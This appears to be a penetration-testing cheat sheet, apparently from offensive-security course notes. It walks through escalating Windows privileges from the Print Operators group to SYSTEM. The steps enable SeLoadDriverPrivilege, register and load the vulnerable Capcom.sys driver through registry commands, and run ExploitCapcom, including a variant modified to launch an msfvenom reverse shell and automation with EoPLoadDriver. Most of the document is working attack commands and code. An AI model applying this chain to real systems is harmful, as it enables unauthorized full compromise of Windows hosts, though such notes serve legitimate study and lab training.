Print Operators grants its members the `SeLoadDriverPrivilege`
**If we issue the command whoami /priv, and don't see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC.**
## Command Line
```
https://github.com/hfiref0x/UACME
```
Check UAC Bypass tab
## GUI
Open an administrative command shell and input the credentials of the account that is a member of the Print Operators group
## SeLoadDriverPrivilege is visible but disabled.
Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. 
1. Download https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp and edit it pasting over the includes below
```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
2. Next, from a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.
```
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
3. download the Capcom.sys driver from https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys, and save it to C:\temp
4. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
5. Run the EnableSeLoadDriverPrivilege.exe binary
	1. Verify Privilege is Enabled
	2. Verify Capcom Driver is Listed
```
.\DriverView.exe /stext drivers.txt
```
```
cat drivers.txt | Select-String -pattern Capcom
```
```
C:\tools\Capcom.sys
```
6. Use `ExploitCapcom` Tool to Escalate Privileges
```
https://github.com/tandasat/ExploitCapcom
```
7. compile it with Visual Studio
```
PS C:\> .\ExploitCapcom.exe
```
## Alternate Exploitation - No GUI
If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling.
Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe
The CommandLine string in this example would be changed to:
```
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
We would set up a listener based on the msfvenom payload we generated and hopefully receive a reverse shell connection back when executing ExploitCapcom.exe. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.
## Automating with EopLoadDriver
use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver. To do this, we would run the following:
```
https://github.com/TarlogicSecurity/EoPLoadDriver/
```
```
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.